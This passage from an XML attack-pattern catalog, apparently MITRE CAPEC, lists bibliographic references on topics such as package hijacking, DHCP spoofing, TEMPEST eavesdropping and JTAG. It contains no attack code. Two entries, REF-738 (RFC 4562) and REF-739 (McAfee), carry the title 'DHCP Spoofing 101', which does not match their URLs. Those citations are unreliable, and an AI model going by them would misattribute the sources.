         <ns0:Title>Attacker Caught Hijacking Packages Using Multiple Techniques to Steal AWS Credentials</ns0:Title>
         <ns0:Publication_Year>2022</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---25</ns0:Publication_Day>
         <ns0:Publisher>Checkmarx</ns0:Publisher>
         <ns0:URL>https://checkmarx.com/blog/attacker-caught-hijacking-packages-using-multiple-techniques-to-steal-aws-credentials/</ns0:URL>
         <ns0:URL_Date>2022-09-09</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-734">
         <ns0:Author>Jossef Harush</ns0:Author>
         <ns0:Title>GitHub RepoJacking Weakness Exploited in the Wild by Attackers</ns0:Title>
         <ns0:Publication_Year>2022</ns0:Publication_Year>
         <ns0:Publication_Month>--05</ns0:Publication_Month>
         <ns0:Publication_Day>---27</ns0:Publication_Day>
         <ns0:Publisher>Checkmarx</ns0:Publisher>
         <ns0:URL>https://checkmarx.com/blog/github-repojacking-weakness-exploited-in-the-wild-by-attackers/</ns0:URL>
         <ns0:URL_Date>2022-09-09</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-735">
         <ns0:Author>Jo Van Bulck</ns0:Author>
         <ns0:Author>Daniel Moghimi</ns0:Author>
         <ns0:Author>Michael Schwarz</ns0:Author>
         <ns0:Author>Moritz Lipp</ns0:Author>
         <ns0:Author>Marina Minkin</ns0:Author>
         <ns0:Author>Daniel Genkin</ns0:Author>
         <ns0:Author>Yuval Yarom</ns0:Author>
         <ns0:Author>Berk Sunar</ns0:Author>
         <ns0:Author>Daniel Gruss</ns0:Author>
         <ns0:Author>Frank Piessens</ns0:Author>
         <ns0:Title>LVI - Hijacking Transient Execution with Load Value Injection</ns0:Title>
         <ns0:URL>https://lviattack.eu/</ns0:URL>
         <ns0:URL_Date>2022-09-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-736">
         <ns0:Title>Load Value Injection</ns0:Title>
         <ns0:Publication_Year>2020</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---27</ns0:Publication_Day>
         <ns0:Publisher>Intel</ns0:Publisher>
         <ns0:URL>https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/load-value-injection.html</ns0:URL>
         <ns0:URL_Date>2022-09-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-737">
         <ns0:Author>Yuval Lazar</ns0:Author>
         <ns0:Title>DHCP Spoofing 101</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--11</ns0:Publication_Month>
         <ns0:Publication_Day>---03</ns0:Publication_Day>
         <ns0:Publisher>Pentera</ns0:Publisher>
         <ns0:URL>https://pentera.io/blog/dhcp-spoofing-101</ns0:URL>
         <ns0:URL_Date>2022-09-22</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-738">
         <ns0:Author>T. Melsen</ns0:Author>
         <ns0:Author>S. Blake</ns0:Author>
         <ns0:Author>Ericsson</ns0:Author>
         <ns0:Title>DHCP Spoofing 101</ns0:Title>
         <ns0:Publication_Year>2006</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publisher>The Internet Society</ns0:Publisher>
         <ns0:URL>https://www.rfc-editor.org/rfc/rfc4562.html</ns0:URL>
         <ns0:URL_Date>2022-09-22</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-739">
         <ns0:Author>Bosco Sebastian</ns0:Author>
         <ns0:Title>DHCP Spoofing 101</ns0:Title>
         <ns0:Publication_Year>2019</ns0:Publication_Year>
         <ns0:Publication_Month>--08</ns0:Publication_Month>
         <ns0:Publication_Day>---02</ns0:Publication_Day>
         <ns0:Publisher>McAfee</ns0:Publisher>
         <ns0:URL>https://www.mcafee.com/blogs/other-blogs/mcafee-labs/dhcp-client-remote-code-execution-vulnerability-demystified/</ns0:URL>
         <ns0:URL_Date>2022-09-22</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-740">
         <ns0:Author>Robert Falcone</ns0:Author>
         <ns0:Title>OilRig uses RGDoor IIS Backdoor on Targets in the Middle East</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--01</ns0:Publication_Month>
         <ns0:Publication_Day>---25</ns0:Publication_Day>
         <ns0:Publisher>Palo Alto Networks</ns0:Publisher>
         <ns0:URL>https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/</ns0:URL>
         <ns0:URL_Date>2022-09-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-741">
         <ns0:Author>ASERT Team</ns0:Author>
         <ns0:Title>STOLEN PENCIL Campaign Targets Academia</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:Publication_Day>---05</ns0:Publication_Day>
         <ns0:Publisher>NETSCOUT</ns0:Publisher>
         <ns0:URL>https://www.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia</ns0:URL>
         <ns0:URL_Date>2022-09-23</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-742">
         <ns0:Author>Florida Industrial Security Working Group (FISWG)</ns0:Author>
         <ns0:Title>Managing a &#8220;Data Spill&#8221;</ns0:Title>
         <ns0:URL>https://fiswg.research.ucf.edu/Documents/PPT/Manage%20a%20Data%20Spill-Contamination%20September%202015.pptx</ns0:URL>
         <ns0:URL_Date>2022-10-31</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-743">
         <ns0:Title>data spillage</ns0:Title>
         <ns0:URL>https://csrc.nist.gov/glossary/term/data_spillage</ns0:URL>
         <ns0:URL_Date>2022-10-31</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-744">
         <ns0:Title>TempestSDR: An SDR Tool For Eavesdropping on Computer Screens Via Unintentionally Radiated RF</ns0:Title>
         <ns0:URL>https://www.rtl-sdr.com/tempestsdr-a-sdr-tool-for-eavesdropping-on-computer-screens-via-unintentionally-radiated-rf/</ns0:URL>
         <ns0:URL_Date>2022-12-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-745">
         <ns0:Author>Dan Maloney</ns0:Author>
         <ns0:Title>Exposing Computer Monitor Side-Channel Vulnerabilities with TempestSDR</ns0:Title>
         <ns0:URL>https://hackaday.com/2020/07/15/exposing-computer-monitor-side-channel-vulnerabilities-with-tempestsdr/</ns0:URL>
         <ns0:URL_Date>2022-12-07</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-746">
         <ns0:Author>CISA</ns0:Author>
         <ns0:Title>Russian State-Sponsored Cyber Actors Targeting Network Infrastructure Devices</ns0:Title>
         <ns0:Publication_Year>2018</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---16</ns0:Publication_Day>
         <ns0:URL>https://www.cisa.gov/uscert/ncas/alerts/TA18-106A</ns0:URL>
         <ns0:URL_Date>2023-01-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-747">
         <ns0:Author>Tommasi F.</ns0:Author>
         <ns0:Author>Catalano, C.</ns0:Author>
         <ns0:Author>Taurino I.</ns0:Author>
         <ns0:Title>Browser-in-the-Middle (BitM) attack</ns0:Title>
         <ns0:Publication_Year>2021</ns0:Publication_Year>
         <ns0:Publication_Month>--04</ns0:Publication_Month>
         <ns0:Publication_Day>---17</ns0:Publication_Day>
         <ns0:URL>https://link.springer.com/article/10.1007/s10207-021-00548-5#citeas</ns0:URL>
         <ns0:URL_Date>2023-01-13</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-748">
         <ns0:Author>Hewlett-Packard Journal</ns0:Author>
         <ns0:Title>Overview of the Test Access Port</ns0:Title>
         <ns0:Publication_Year>1994</ns0:Publication_Year>
         <ns0:Publication_Month>--12</ns0:Publication_Month>
         <ns0:URL>https://www.hpl.hp.com/hpjournal/94dec/dec94a7a.pdf</ns0:URL>
         <ns0:URL_Date>2023-01-18</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-749">
         <ns0:Title>Finding Faults with the Test Access Port (TAP)</ns0:Title>
         <ns0:Publication_Year>2017</ns0:Publication_Year>
         <ns0:Publication_Month>--06</ns0:Publication_Month>
         <ns0:Publication_Day>---12</ns0:Publication_Day>
         <ns0:URL>https://flynn.com/2017/06/12/finding-faults-with-the-test-access-port-tap/</ns0:URL>
         <ns0:URL_Date>2023-01-18</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-750">
         <ns0:Title>Technical Guide to JTAG</ns0:Title>
         <ns0:URL>https://www.xjtag.com/about-jtag/jtag-a-technical-overview/</ns0:URL>
         <ns0:URL_Date>2023-01-18</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-751">
         <ns0:Title>HTTP Flood Attack</ns0:Title>
         <ns0:URL>https://www.cloudflare.com/learning/ddos/http-flood-ddos-attack/</ns0:URL>
         <ns0:URL_Date>2023-01-20</ns0:URL_Date>
      </ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-752">
         <ns0:Title>ATT&amp;CK ICS</ns0:Title>
         <ns0:URL>https://attack.mitre.org/matrices/ics/</ns0:URL>
         <ns0:URL_Date>2023-01-24</ns0:URL_Date>
      </ns0:External_Reference>
   </ns0:External_References>
<script /></ns0:Attack_Pattern_Catalog>